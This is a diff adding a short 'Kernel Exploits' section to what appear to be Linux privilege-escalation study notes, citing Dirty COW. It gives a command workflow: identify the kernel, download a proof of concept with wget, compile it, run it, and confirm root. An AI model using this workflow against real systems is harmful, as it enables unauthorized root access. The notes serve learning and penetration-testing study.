@@ -1959,3 +1959,57 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 
 ---
+
+# Kernel Exploits\
+
+* **What:** Kernel-level exploits leverage kernel vulnerabilities to run code as `root`.
+
+* **Example:** Dirty COW — `CVE-2016-5195`.
+
+* **Why common:** Legacy/unpatched systems; sometimes excluded from patching for compatibility.
+
+* **Quick identification:**
+
+  * Get kernel string:
+
+```bash
+uname -a
+```
+
+* Get distro/release info:
+
+```bash
+cat /etc/lsb-release
+```
+
+* Search the exact kernel string (e.g. `"4.4.0-116-generic exploit"`) to find PoCs.
+
+* **PoC workflow (as given):**
+
+  1. Obtain PoC (example method mentioned):
+
+```bash
+wget <exploit_url>
+```
+
+2. Compile exploit and make executable:
+
+```bash
+gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
+```
+
+3. Run exploit:
+
+```bash
+./kernel_exploit
+```
+
+4. Confirm root:
+
+```bash
+whoami
+```
+
+* **Caution:** Kernel exploits can cause system instability — **use caution**, avoid running on production systems.
+
+---
